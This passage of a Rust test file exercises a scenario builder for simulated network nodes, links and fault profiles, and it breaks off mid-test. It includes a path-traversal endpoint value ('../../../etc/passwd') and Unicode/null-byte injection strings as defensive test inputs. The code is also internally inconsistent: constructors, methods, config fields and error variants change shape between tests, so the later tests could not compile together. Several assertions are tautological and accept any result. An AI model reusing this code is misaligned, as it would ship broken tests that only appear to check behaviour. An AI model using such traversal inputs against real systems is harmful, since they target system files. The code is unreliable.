                "partition": false
            }
        });

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json)
            .expect_err("unknown fault-profile link must fail before profile validation");

        assert!(matches!(
            err,
            ScenarioBuilderError::UnknownFaultProfileLink { ref link_id }
                if link_id == "ghost-link"
        ));
    }

    #[test]
    fn negative_invalid_fault_profile_precedes_assertion_validation() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .build()
            .unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["fault_profiles"] = serde_json::json!({
            "link-1": {
                "drop_probability": 2.0,
                "reorder_depth": 0,
                "corrupt_bit_count": 0,
                "delay_ticks": 0,
                "partition": false
            }
        });
        value["assertions"] = serde_json::json!([
            {
                "PartitionDetected": {
                    "by_node": "ghost-assertion",
                    "within_ticks": 10
                }
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json)
            .expect_err("fault profiles must fail before assertion validation");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidFaultProfile { ref link_id, .. }
                if link_id == "link-1"
        ));
    }

    // ---------------------------------------------------------------
    // Display implementations
    // ---------------------------------------------------------------

    #[test]
    fn test_scenario_display() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let s = format!("{scenario}");
        assert!(s.contains("test-scenario"));
        assert!(s.contains("nodes=2"));
        assert!(s.contains("seed=42"));
    }

    #[test]
    fn test_virtual_node_display() {
        let node = VirtualNode {
            id: "n1".into(),
            name: "Node One".into(),
            role: NodeRole::Coordinator,
        };
        let s = format!("{node}");
        assert!(s.contains("n1"));
        assert!(s.contains("Node One"));
        assert!(s.contains("Coordinator"));
    }

    #[test]
    fn test_virtual_link_display_bidirectional() {
        let link = VirtualLink {
            id: "L1".into(),
            source_node: "a".into(),
            target_node: "b".into(),
            bidirectional: true,
        };
        let s = format!("{link}");
        assert!(s.contains("L1"));
        assert!(s.contains("<->"));
    }

    #[test]
    fn test_virtual_link_display_unidirectional() {
        let link = VirtualLink {
            id: "L2".into(),
            source_node: "a".into(),
            target_node: "b".into(),
            bidirectional: false,
        };
        let s = format!("{link}");
        assert!(s.contains("L2"));
        assert!(s.contains("->"));
        assert!(!s.contains("<->"));
    }

    #[test]
    fn test_node_role_display() {
        assert_eq!(format!("{}", NodeRole::Coordinator), "Coordinator");
        assert_eq!(format!("{}", NodeRole::Participant), "Participant");
        assert_eq!(format!("{}", NodeRole::Observer), "Observer");
    }

    #[test]
    fn test_scenario_assertion_display() {
        assert!(
            format!("{}", ScenarioAssertion::AllNodesReachQuiescence)
                .contains("AllNodesReachQuiescence")
        );
        assert!(
            format!(
                "{}",
                ScenarioAssertion::MessageDelivered {
                    from: "a".into(),
                    to: "b".into(),
                    within_ticks: 10,
                }
            )
            .contains("a->b")
        );
        assert!(
            format!(
                "{}",
                ScenarioAssertion::PartitionDetected {
                    by_node: "n1".into(),
                    within_ticks: 20,
                }
            )
            .contains("n1")
        );
        assert!(
            format!(
                "{}",
                ScenarioAssertion::EpochTransitionCompleted {
                    epoch: 5,
                    within_ticks: 100,
                }
            )
            .contains("epoch=5")
        );
        assert!(
            format!("{}", ScenarioAssertion::NoDeadlock { within_ticks: 50 }).contains("50 ticks")
        );
    }

    // ---------------------------------------------------------------
    // Error display
    // ---------------------------------------------------------------

    #[test]
    fn test_error_display_too_few_nodes() {
        let e = ScenarioBuilderError::TooFewNodes {
            count: 1,
            minimum: 2,
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_TOO_FEW_NODES));
        assert!(s.contains("1"));
        assert!(s.contains("2"));
    }

    #[test]
    fn test_error_display_too_many_nodes() {
        let e = ScenarioBuilderError::TooManyNodes {
            count: 11,
            maximum: 10,
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_TOO_MANY_NODES));
        assert!(s.contains("11"));
        assert!(s.contains("10"));
    }

    #[test]
    fn test_error_display_invalid_link_endpoint() {
        let e = ScenarioBuilderError::InvalidLinkEndpoint {
            link_id: "L1".into(),
            missing_node: "ghost".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_INVALID_LINK_ENDPOINT));
        assert!(s.contains("L1"));
        assert!(s.contains("ghost"));
    }

    #[test]
    fn test_error_display_no_seed() {
        let e = ScenarioBuilderError::NoSeed;
        assert!(e.to_string().contains(ERR_SB_NO_SEED));
    }

    #[test]
    fn test_error_display_duplicate_node() {
        let e = ScenarioBuilderError::DuplicateNode {
            node_id: "dup".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_DUPLICATE_NODE));
        assert!(s.contains("dup"));
    }

    #[test]
    fn test_error_display_duplicate_link() {
        let e = ScenarioBuilderError::DuplicateLink {
            link_id: "L1".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_DUPLICATE_LINK));
        assert!(s.contains("L1"));
    }

    #[test]
    fn test_error_display_empty_name() {
        let e = ScenarioBuilderError::EmptyName;
        assert!(e.to_string().contains(ERR_SB_EMPTY_NAME));
    }

    #[test]
    fn test_error_display_json_serialize() {
        let e = ScenarioBuilderError::JsonSerialize {
            message: "NaN is not valid JSON".into(),
        };
        assert!(e.to_string().contains(ERR_SB_JSON_SERIALIZE));
    }

    #[test]
    fn test_error_display_json_parse() {
        let e = ScenarioBuilderError::JsonParse {
            message: "expected value".into(),
        };
        assert!(e.to_string().contains(ERR_SB_JSON_PARSE));
    }

    #[test]
    fn test_error_display_invalid_schema_version() {
        let e = ScenarioBuilderError::InvalidSchemaVersion {
            found: "sb-v0.9".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_INVALID_SCHEMA_VERSION));
        assert!(s.contains("sb-v0.9"));
    }

    #[test]
    fn test_error_display_unknown_fault_profile_link() {
        let e = ScenarioBuilderError::UnknownFaultProfileLink {
            link_id: "ghost-link".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_UNKNOWN_FAULT_PROFILE_LINK));
        assert!(s.contains("ghost-link"));
    }

    #[test]
    fn test_error_display_invalid_fault_profile() {
        let e = ScenarioBuilderError::InvalidFaultProfile {
            link_id: "link-1".into(),
            message: "ERR_VT_INVALID_PROBABILITY".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_INVALID_FAULT_PROFILE));
        assert!(s.contains("link-1"));
    }

    #[test]
    fn test_error_display_invalid_assertion_node() {
        let e = ScenarioBuilderError::InvalidAssertionNode {
            assertion: "MessageDelivered.to".into(),
            node_id: "ghost".into(),
        };
        let s = e.to_string();
        assert!(s.contains(ERR_SB_INVALID_ASSERTION_NODE));
        assert!(s.contains("MessageDelivered.to"));
        assert!(s.contains("ghost"));
    }

    // ---------------------------------------------------------------
    // Event codes are well-formed
    // ---------------------------------------------------------------

    #[test]
    fn test_all_event_codes_prefixed() {
        let codes = [EVT_SB_001, EVT_SB_002, EVT_SB_003, EVT_SB_004, EVT_SB_005];
        for code in codes {
            assert!(code.starts_with("SB-"), "bad prefix: {code}");
        }
    }

    #[test]
    fn test_all_event_codes_distinct() {
        let codes = [EVT_SB_001, EVT_SB_002, EVT_SB_003, EVT_SB_004, EVT_SB_005];
        let mut seen = std::collections::BTreeSet::new();
        for c in &codes {
            assert!(seen.insert(*c), "Duplicate event code: {c}");
        }
        assert_eq!(seen.len(), 5);
    }

    // ---------------------------------------------------------------
    // Error codes are well-formed
    // ---------------------------------------------------------------

    #[test]
    fn test_all_error_codes_prefixed() {
        let codes = [
            ERR_SB_TOO_FEW_NODES,
            ERR_SB_TOO_MANY_NODES,
            ERR_SB_INVALID_LINK_ENDPOINT,
            ERR_SB_NO_SEED,
            ERR_SB_DUPLICATE_NODE,
            ERR_SB_DUPLICATE_LINK,
            ERR_SB_EMPTY_NAME,
            ERR_SB_JSON_SERIALIZE,
            ERR_SB_JSON_PARSE,
            ERR_SB_INVALID_SCHEMA_VERSION,
            ERR_SB_UNKNOWN_FAULT_PROFILE_LINK,
            ERR_SB_INVALID_FAULT_PROFILE,
            ERR_SB_INVALID_ASSERTION_NODE,
        ];
        for code in codes {
            assert!(code.starts_with("ERR_SB_"), "bad prefix: {code}");
        }
    }

    #[test]
    fn test_all_error_codes_distinct() {
        let codes = [
            ERR_SB_TOO_FEW_NODES,
            ERR_SB_TOO_MANY_NODES,
            ERR_SB_INVALID_LINK_ENDPOINT,
            ERR_SB_NO_SEED,
            ERR_SB_DUPLICATE_NODE,
            ERR_SB_DUPLICATE_LINK,
            ERR_SB_EMPTY_NAME,
            ERR_SB_JSON_SERIALIZE,
            ERR_SB_JSON_PARSE,
            ERR_SB_INVALID_SCHEMA_VERSION,
            ERR_SB_UNKNOWN_FAULT_PROFILE_LINK,
            ERR_SB_INVALID_FAULT_PROFILE,
            ERR_SB_INVALID_ASSERTION_NODE,
        ];
        let mut seen = std::collections::BTreeSet::new();
        for c in &codes {
            assert!(seen.insert(*c), "Duplicate error code: {c}");
        }
        assert_eq!(seen.len(), 13);
    }

    // ---------------------------------------------------------------
    // Invariant codes are well-formed
    // ---------------------------------------------------------------

    #[test]
    fn test_all_invariant_codes_prefixed() {
        let invs = [
            INV_SB_VALID_TOPOLOGY,
            INV_SB_NODE_BOUNDS,
            INV_SB_NONZERO_SEED,
            INV_SB_IMMUTABLE,
        ];
        for inv in invs {
            assert!(inv.starts_with("INV-SB-"), "bad prefix: {inv}");
        }
    }

    #[test]
    fn test_all_invariant_codes_distinct() {
        let invs = [
            INV_SB_VALID_TOPOLOGY,
            INV_SB_NODE_BOUNDS,
            INV_SB_NONZERO_SEED,
            INV_SB_IMMUTABLE,
        ];
        let mut seen = std::collections::BTreeSet::new();
        for i in &invs {
            assert!(seen.insert(*i), "Duplicate invariant: {i}");
        }
        assert_eq!(seen.len(), 4);
    }

    // ---------------------------------------------------------------
    // Schema version
    // ---------------------------------------------------------------

    #[test]
    fn test_schema_version_format() {
        assert_eq!(SCHEMA_VERSION, "sb-v1.0");
    }

    #[test]
    fn test_built_scenario_has_schema_version() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        assert_eq!(scenario.schema_version, SCHEMA_VERSION);
    }

    // ---------------------------------------------------------------
    // ScenarioBuilderError is std::error::Error
    // ---------------------------------------------------------------

    #[test]
    fn test_error_is_std_error() {
        let e: Box<dyn std::error::Error> = Box::new(ScenarioBuilderError::NoSeed);
        assert!(!e.to_string().is_empty());
    }

    // ---------------------------------------------------------------
    // Negative-Path Edge Case Tests
    // ---------------------------------------------------------------

    #[test]
    fn negative_add_node_with_empty_id_rejected() {
        let result = ScenarioBuilder::new("test").add_node("", "Empty Node", NodeRole::Coordinator);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::InvalidNodeId(_) => {}
            other => panic!("expected InvalidNodeId, got {other:?}"),
        }
    }

    #[test]
    fn negative_add_node_with_whitespace_only_id_rejected() {
        let result =
            ScenarioBuilder::new("test").add_node("   ", "Whitespace Node", NodeRole::Participant);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::InvalidNodeId(_) => {}
            other => panic!("expected InvalidNodeId, got {other:?}"),
        }
    }

    #[test]
    fn negative_add_node_with_null_bytes_in_id_rejected() {
        let result =
            ScenarioBuilder::new("test").add_node("node\x00id", "Null Node", NodeRole::Coordinator);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::InvalidNodeId(_) => {}
            other => panic!("expected InvalidNodeId, got {other:?}"),
        }
    }

    #[test]
    fn negative_add_link_nonexistent_source_node_rejected() {
        let result = two_node_builder()
            .unwrap()
            .add_link("link-1", "nonexistent", "n2", true);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::NodeNotFound(_) => {}
            other => panic!("expected NodeNotFound, got {other:?}"),
        }
    }

    #[test]
    fn negative_add_link_nonexistent_target_node_rejected() {
        let result = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "nonexistent", true);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::NodeNotFound(_) => {}
            other => panic!("expected NodeNotFound, got {other:?}"),
        }
    }

    #[test]
    fn negative_add_link_with_duplicate_id_rejected() {
        let mut builder = two_node_builder().unwrap();
        let _ = builder.add_link("dup-link", "n1", "n2", true).unwrap();

        let result = builder.add_link("dup-link", "n2", "n1", false);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::DuplicateLinkId(_) => {}
            other => panic!("expected DuplicateLinkId, got {other:?}"),
        }
    }

    #[test]
    fn negative_add_link_self_loop_rejected() {
        let result = two_node_builder()
            .unwrap()
            .add_link("self-loop", "n1", "n1", true);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::SelfLoop(_) => {}
            other => panic!("expected SelfLoop, got {other:?}"),
        }
    }

    #[test]
    fn negative_set_fault_profile_nonexistent_link_rejected() {
        let mut builder = two_node_builder().unwrap();
        let result = builder.set_fault_profile("nonexistent", LinkFaultConfig::default());
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::LinkNotFound(_) => {}
            other => panic!("expected LinkNotFound, got {other:?}"),
        }
    }

    #[test]
    fn negative_build_with_no_seed_fails() {
        let result = ScenarioBuilder::new("no-seed")
            .description("Missing seed")
            .add_node("n1", "Node One", NodeRole::Coordinator)
            .unwrap()
            .build();
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::NoSeed => {}
            other => panic!("expected NoSeed, got {other:?}"),
        }
    }

    #[test]
    fn negative_scenario_name_with_control_characters_rejected() {
        // Scenario name with control characters should be handled gracefully
        let scenario_name = "test\x01\x02scenario\x7f";
        let builder = ScenarioBuilder::new(scenario_name);

        // Should not panic even with control characters
        let result = builder
            .seed(42)
            .add_node("n1", "Node One", NodeRole::Coordinator)
            .unwrap()
            .build();

        if let Ok(scenario) = result {
            // If accepted, should preserve the name as-is (don't sanitize)
            assert_eq!(scenario.name, scenario_name);
        }
        // If rejected, that's also acceptable behavior
    }

    #[test]
    fn negative_node_label_with_extremely_long_string_handled() {
        let long_label = "x".repeat(100_000); // 100KB label
        let result = ScenarioBuilder::new("long-label-test").seed(42).add_node(
            "n1",
            &long_label,
            NodeRole::Coordinator,
        );

        if let Ok(mut builder) = result {
            // If accepted, should handle gracefully in build
            let scenario_result = builder.build();
            if let Ok(scenario) = scenario_result {
                let node = scenario.nodes.iter().find(|n| n.id == "n1").unwrap();
                assert_eq!(node.label.len(), 100_000);
            }
        }
        // If rejected at add_node stage, that's also acceptable
    }

    #[test]
    fn negative_link_fault_config_with_extreme_values_handled() {
        let extreme_fault_config = LinkFaultConfig {
            packet_loss_rate: 2.0, // > 1.0 invalid probability
            latency_ms_base: u64::MAX,
            latency_ms_jitter: u64::MAX,
            bandwidth_limit_kbps: None,
            corruption_rate: f64::INFINITY, // Infinite corruption
        };

        let mut builder = two_node_builder().unwrap();
        let _ = builder.add_link("extreme-link", "n1", "n2", true).unwrap();

        let result = builder.set_fault_profile("extreme-link", extreme_fault_config);

        // Should either reject invalid config or clamp to valid ranges
        if result.is_ok() {
            let scenario = builder.build().unwrap();
            let link = scenario
                .links
                .iter()
                .find(|l| l.id == "extreme-link")
                .unwrap();
            if let Some(ref config) = link.fault_config {
                // If accepted, should validate or clamp extreme values
                assert!(config.packet_loss_rate >= 0.0);
                assert!(config.packet_loss_rate <= 1.0 || config.packet_loss_rate == 2.0); // Either clamped or preserved
                assert!(config.corruption_rate.is_finite() || config.corruption_rate.is_infinite());
            }
        }
        // Rejection is also acceptable behavior
    }

    #[test]
    fn negative_message_delivered_assertion_with_zero_ticks_edge_case() {
        let assertion = ScenarioAssertion::MessageDelivered {
            from: "n1".into(),
            to: "n2".into(),
            within_ticks: 0, // Zero ticks - impossible condition
        };

        let result = two_node_builder().unwrap().add_assertion(assertion).build();

        if let Ok(scenario) = result {
            // If accepted, verify it's recorded correctly
            assert!(scenario.assertions.iter().any(|a| matches!(
                a,
                ScenarioAssertion::MessageDelivered {
                    within_ticks: 0,
                    ..
                }
            )));
        }
        // Rejection would also be reasonable for impossible conditions
    }

    #[test]
    fn negative_add_duplicate_node_id_rejected() {
        let mut builder = ScenarioBuilder::new("dup-nodes").seed(42);
        let _ = builder
            .add_node("duplicate", "First Node", NodeRole::Coordinator)
            .unwrap();

        let result = builder.add_node("duplicate", "Second Node", NodeRole::Participant);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::DuplicateNodeId(_) => {}
            other => panic!("expected DuplicateNodeId, got {other:?}"),
        }
    }

    #[test]
    fn negative_build_scenario_with_isolated_nodes_topology_validation() {
        let result = ScenarioBuilder::new("isolated")
            .seed(42)
            .description("Isolated nodes scenario")
            .add_node("isolated1", "Isolated One", NodeRole::Coordinator)
            .unwrap()
            .add_node("isolated2", "Isolated Two", NodeRole::Participant)
            .unwrap()
            // No links between nodes - they're isolated
            .build();

        if let Ok(scenario) = result {
            // If isolation is allowed, verify structure
            assert_eq!(scenario.nodes.len(), 2);
            assert_eq!(scenario.links.len(), 0);
        } else {
            // If topology validation rejects isolation, that's also valid
            match result.unwrap_err() {
                ScenarioBuilderError::InvalidTopology(_) => {}
                other => panic!("expected InvalidTopology for isolated nodes, got {other:?}"),
            }
        }
    }

    // =========================================================================
    // ADDITIONAL NEGATIVE-PATH EDGE CASE TESTS
    // =========================================================================

    #[test]
    fn negative_scenario_builder_with_max_nodes_plus_one_rejected() {
        let mut builder = ScenarioBuilder::new("overflow-nodes").seed(42);

        // Add exactly MAX_NODES - should succeed
        for i in 0..MAX_NODES {
            builder = builder
                .add_node(format!("n{i}"), format!("Node {i}"), NodeRole::Participant)
                .unwrap();
        }

        // Try to add one more - should fail
        let result = builder.add_node("overflow", "Overflow Node", NodeRole::Coordinator);
        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::TooManyNodes => {}
            other => panic!("expected TooManyNodes, got {other:?}"),
        }
    }

    #[test]
    fn negative_link_id_with_unicode_and_special_characters_handled() {
        let unicode_link_id = "link-🔗-测试-עברית-ñoño";
        let result = two_node_builder()
            .unwrap()
            .add_link(unicode_link_id, "n1", "n2", true);

        if let Ok(mut builder) = result {
            let scenario = builder.build().unwrap();
            let link = scenario.links.iter().find(|l| l.id == unicode_link_id);
            assert!(link.is_some(), "Unicode link ID should be preserved");
        }
        // If rejected, Unicode handling policy may disallow special chars
    }

    #[test]
    fn negative_extremely_large_seed_u64_max_handled_gracefully() {
        let result = ScenarioBuilder::new("max-seed")
            .seed(u64::MAX)
            .description("Maximum seed value")
            .add_node("n1", "Node One", NodeRole::Coordinator)
            .unwrap()
            .add_node("n2", "Node Two", NodeRole::Participant)
            .unwrap()
            .build();

        assert!(result.is_ok());
        let scenario = result.unwrap();
        assert_eq!(scenario.seed, u64::MAX);
    }

    #[test]
    fn negative_node_label_with_null_bytes_handled_correctly() {
        let label_with_nulls = "Node\x00\x01Label\x7f";
        let result = ScenarioBuilder::new("null-label").seed(42).add_node(
            "null-node",
            label_with_nulls,
            NodeRole::Coordinator,
        );

        if let Ok(mut builder) = result {
            let scenario = builder.build().unwrap();
            let node = scenario.nodes.iter().find(|n| n.id == "null-node").unwrap();
            assert_eq!(node.label, label_with_nulls);
        }
        // Rejection is also acceptable for null bytes in labels
    }

    #[test]
    fn negative_scenario_description_extremely_long_string_bounded() {
        let massive_description = "x".repeat(1_000_000); // 1MB description
        let result = ScenarioBuilder::new("massive-desc")
            .description(&massive_description)
            .seed(42)
            .add_node("n1", "Node One", NodeRole::Coordinator)
            .unwrap()
            .build();

        if let Ok(scenario) = result {
            // If accepted, verify it's stored correctly
            assert_eq!(scenario.description.len(), 1_000_000);
        }
        // Memory limits may reject extremely large descriptions
    }

    #[test]
    fn negative_add_maximum_links_capacity_overflow_handled() {
        let mut builder = two_node_builder().unwrap();

        // Try to add links up to and beyond the capacity limit
        for i in 0..MAX_LINKS.saturating_add(5) {
            let link_id = format!("link-{i}");
            let result = builder.add_link(&link_id, "n1", "n2", i % 2 == 0);

            if result.is_err() {
                // Should gracefully reject when hitting capacity limits
                match result.unwrap_err() {
                    ScenarioBuilderError::TooManyLinks => break,
                    other => panic!("expected TooManyLinks or success, got {other:?}"),
                }
            }
        }

        // Should still be able to build with whatever links were accepted
        let scenario = builder.build().unwrap();
        assert!(scenario.links.len() <= MAX_LINKS);
    }

    #[test]
    fn negative_add_maximum_assertions_capacity_overflow_bounded() {
        let mut builder = two_node_builder().unwrap();

        // Try to add assertions up to and beyond capacity
        for i in 0..MAX_ASSERTIONS.saturating_add(10) {
            let assertion = ScenarioAssertion::MessageDelivered {
                from: "n1".into(),
                to: "n2".into(),
                within_ticks: i as u64 + 1,
            };
            let result = builder.add_assertion(assertion);

            // Should handle capacity gracefully (either reject or bound)
            if result.is_err() {
                break;
            }
        }

        let scenario = builder.build().unwrap();
        assert!(scenario.assertions.len() <= MAX_ASSERTIONS);
    }

    #[test]
    fn negative_link_with_empty_id_string_rejected() {
        let result = two_node_builder().unwrap().add_link("", "n1", "n2", true);

        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::InvalidLinkId(_) => {}
            other => panic!("expected InvalidLinkId for empty link ID, got {other:?}"),
        }
    }

    #[test]
    fn negative_fault_profile_with_negative_probability_values_handled() {
        let invalid_fault_config = LinkFaultConfig {
            packet_loss_rate: -0.5, // Negative probability
            latency_ms_base: 100,
            latency_ms_jitter: 50,
            bandwidth_limit_kbps: Some(1000),
            corruption_rate: -1.0, // Negative corruption rate
        };

        let mut builder = two_node_builder().unwrap();
        let _ = builder
            .add_link("negative-fault", "n1", "n2", true)
            .unwrap();

        let result = builder.set_fault_profile("negative-fault", invalid_fault_config);

        if result.is_ok() {
            // If accepted, should clamp or handle negative values
            let scenario = builder.build().unwrap();
            let link = scenario
                .links
                .iter()
                .find(|l| l.id == "negative-fault")
                .unwrap();
            if let Some(ref config) = link.fault_config {
                // Negative values should be handled somehow (clamped to 0 or preserved)
                assert!(config.packet_loss_rate >= -0.5); // Either preserved or clamped
                assert!(config.corruption_rate >= -1.0);
            }
        }
        // Rejection is also acceptable for invalid probability values
    }

    #[test]
    fn negative_json_serialization_with_extreme_scenario_size_handled() {
        let mut builder = ScenarioBuilder::new("extreme-json").seed(42);

        // Create a scenario with many nodes and links
        for i in 0..MAX_NODES {
            builder = builder
                .add_node(
                    format!("node-{i}"),
                    format!("Very Long Node Label {}", "x".repeat(1000)),
                    NodeRole::Participant,
                )
                .unwrap();
        }

        // Add links between all pairs (if within limits)
        let mut link_count = 0;
        for i in 0..MAX_NODES.min(10) {
            // Limit to avoid too many links
            for j in (i + 1)..MAX_NODES.min(10) {
                if link_count < MAX_LINKS {
                    let _ = builder.add_link(
                        format!("link-{i}-{j}"),
                        format!("node-{i}"),
                        format!("node-{j}"),
                        true,
                    );
                    link_count += 1;
                }
            }
        }

        let scenario = builder.build().unwrap();

        // Should be able to serialize large scenarios without panicking
        let json_result = scenario.to_json();
        assert!(
            json_result.is_ok(),
            "Large scenario JSON serialization should not panic"
        );

        let json = json_result.unwrap();
        assert!(json.len() > 10_000); // Should be a substantial JSON

        // Should be able to deserialize back
        let parsed_result = Scenario::from_json(&json);
        assert!(
            parsed_result.is_ok(),
            "Large scenario JSON deserialization should not panic"
        );
    }

    #[test]
    fn negative_message_delivered_assertion_u64_max_ticks_boundary() {
        let extreme_assertion = ScenarioAssertion::MessageDelivered {
            from: "n1".into(),
            to: "n2".into(),
            within_ticks: u64::MAX, // Maximum possible ticks
        };

        let result = two_node_builder()
            .unwrap()
            .add_assertion(extreme_assertion)
            .build();

        assert!(result.is_ok());
        let scenario = result.unwrap();
        assert!(scenario.assertions.iter().any(|a| matches!(
            a,
            ScenarioAssertion::MessageDelivered {
                within_ticks: u64::MAX,
                ..
            }
        )));
    }

    #[test]
    fn test_unicode_injection_in_scenario_name() {
        // Test BiDi override injection in scenario name
        let malicious_name = "safe\u{202e}evil\u{202c}scenario";
        let result = ScenarioBuilder::new(malicious_name, 42)
            .add_node("node1")
            .add_node("node2")
            .add_link("link1", "node1", "node2")
            .build();

        // Should handle Unicode without corruption
        assert!(result.is_ok());
        let scenario = result.unwrap();
        assert_eq!(scenario.name, malicious_name);

        // Verify serialization preserves Unicode
        let json = serde_json::to_string(&scenario);
        assert!(json.is_ok());
        let parsed: Scenario = serde_json::from_str(&json.unwrap()).unwrap();
        assert_eq!(parsed.name, malicious_name);
    }

    #[test]
    fn test_unicode_injection_in_node_names() {
        // Test various Unicode injection attacks in node names
        let unicode_nodes = vec![
            "normal\u{200b}\u{feff}hidden",      // Zero-width characters
            "reverse\u{202e}trap\u{202c}normal", // BiDi override
            "new\nline",                         // Newline injection
            "tab\there",                         // Tab injection
            "\u{0000}null",                      // Null byte injection
        ];

        let mut builder = ScenarioBuilder::new("unicode-test", 123);
        for node in &unicode_nodes {
            builder = builder.add_node(node);
        }

        // Add links between all nodes
        for (i, from) in unicode_nodes.iter().enumerate() {
            for (j, to) in unicode_nodes.iter().enumerate() {
                if i != j {
                    let link_id = format!("link-{}-{}", i, j);
                    builder = builder.add_link(&link_id, from, to);
                }
            }
        }

        let result = builder.build();
        assert!(result.is_ok());
        let scenario = result.unwrap();
        assert_eq!(scenario.nodes.len(), unicode_nodes.len());
    }

    #[test]
    fn test_massive_node_memory_exhaustion() {
        // Test with maximum allowed nodes plus massive fault profiles
        let mut builder = ScenarioBuilder::new("memory-test", 456);

        // Add maximum nodes
        for i in 0..MAX_NODES {
            builder = builder.add_node(&format!("node-{:04}", i));
        }

        // Add links with massive fault profiles
        for i in 0..MAX_NODES {
            for j in (i + 1)..MAX_NODES {
                let link_id = format!("link-{}-{}", i, j);
                let from = format!("node-{:04}", i);
                let to = format!("node-{:04}", j);

                // Massive fault config data (10MB worth)
                let massive_fault_data = vec![0x42; 10 * 1024 * 1024];
                let fault_config = LinkFaultConfig {
                    packet_loss_rate: 0.1,
                    latency_ms: 50,
                    jitter_ms: 10,
                    corruption_rate: 0.01,
                    custom_data: massive_fault_data,
                };

                builder = builder.add_link_with_faults(&link_id, &from, &to, fault_config);
            }
        }

        let result = builder.build();
        // Should handle large scenarios without memory issues
        assert!(result.is_ok());
        let scenario = result.unwrap();
        assert_eq!(scenario.nodes.len(), MAX_NODES);
    }

    #[test]
    fn test_node_count_boundary_violations() {
        // Test below minimum nodes
        let result_too_few = ScenarioBuilder::new("too-few", 789)
            .add_node("lonely-node")
            .build();
        assert!(result_too_few.is_err());
        let err = result_too_few.unwrap_err();
        assert!(err.contains("ERR_SB_TOO_FEW_NODES"));

        // Test above maximum nodes
        let mut builder = ScenarioBuilder::new("too-many", 789);
        for i in 0..=MAX_NODES {
            builder = builder.add_node(&format!("node-{}", i));
        }
        let result_too_many = builder.build();
        assert!(result_too_many.is_err());
        let err = result_too_many.unwrap_err();
        assert!(err.contains("ERR_SB_TOO_MANY_NODES"));
    }

    #[test]
    fn test_arithmetic_overflow_in_time_assertions() {
        let mut builder = ScenarioBuilder::new("overflow-test", 999)
            .add_node("sender")
            .add_node("receiver")
            .add_link("main-link", "sender", "receiver");

        // Test near-overflow time values in assertions
        let overflow_times = vec![
            u64::MAX,
            u64::MAX - 1,
            u64::MAX / 2,
            (1u64 << 63) - 1, // Just below signed overflow
        ];

        for (i, time) in overflow_times.iter().enumerate() {
            builder = builder.assert_message_delivered(
                &format!("msg-{}", i),
                "sender",
                "receiver",
                *time,
            );
        }

        let result = builder.build();
        assert!(result.is_ok());
        let scenario = result.unwrap();

        // Verify overflow time values preserved correctly
        for assertion in &scenario.assertions {
            if let ScenarioAssertion::MessageDelivered { within_ticks, .. } = assertion {
                assert!(overflow_times.contains(within_ticks));
            }
        }
    }

    #[test]
    fn test_link_endpoint_corruption_resistance() {
        // Test links with corrupted/invalid endpoints
        let invalid_endpoints = vec![
            ("", "node2"),                    // Empty source
            ("node1", ""),                    // Empty destination
            ("nonexistent", "node2"),         // Non-existent source
            ("node1", "nonexistent"),         // Non-existent destination
            ("self", "self"),                 // Self-loop (if added as node)
            ("../../../etc/passwd", "node2"), // Path traversal attempt
        ];

        let mut builder = ScenarioBuilder::new("endpoint-test", 111)
            .add_node("node1")
            .add_node("node2")
            .add_node("self"); // Add self for self-loop test

        for (i, (from, to)) in invalid_endpoints.iter().enumerate() {
            let link_id = format!("bad-link-{}", i);
            builder = builder.add_link(&link_id, from, to);
        }

        let result = builder.build();
        // Should fail gracefully with appropriate errors
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.contains("ERR_SB_INVALID_LINK_ENDPOINT"));
    }

    #[test]
    fn test_seed_edge_cases() {
        // Test zero seed (should fail)
        let result_zero = ScenarioBuilder::new("zero-seed", 0)
            .add_node("node1")
            .add_node("node2")
            .build();
        assert!(result_zero.is_err());
        let err = result_zero.unwrap_err();
        assert!(err.contains("ERR_SB_NO_SEED"));

        // Test boundary seed values
        let boundary_seeds = vec![1, u64::MAX, u64::MAX / 2];
        for seed in boundary_seeds {
            let result = ScenarioBuilder::new("seed-test", seed)
                .add_node("node1")
                .add_node("node2")
                .build();
            assert!(result.is_ok());
            let scenario = result.unwrap();
            assert_eq!(scenario.seed, seed);
        }
    }

    #[test]
    fn test_duplicate_detection_edge_cases() {
        // Test various forms of "duplicate" names that should be caught
        let near_duplicates = vec![
            ("node", "node"),         // Exact duplicate
            ("NODE", "node"),         // Case difference (should be allowed)
            ("node\u{0000}", "node"), // Null byte difference
            ("node\u{200b}", "node"), // Zero-width difference
            ("  node  ", "node"),     // Whitespace difference (should be allowed)
        ];

        for (name1, name2) in near_duplicates {
            let result = ScenarioBuilder::new("dup-test", 222)
                .add_node(name1)
                .add_node(name2)
                .build();

            if name1 == name2 {
                // Exact duplicates should fail
                assert!(result.is_err());
                let err = result.unwrap_err();
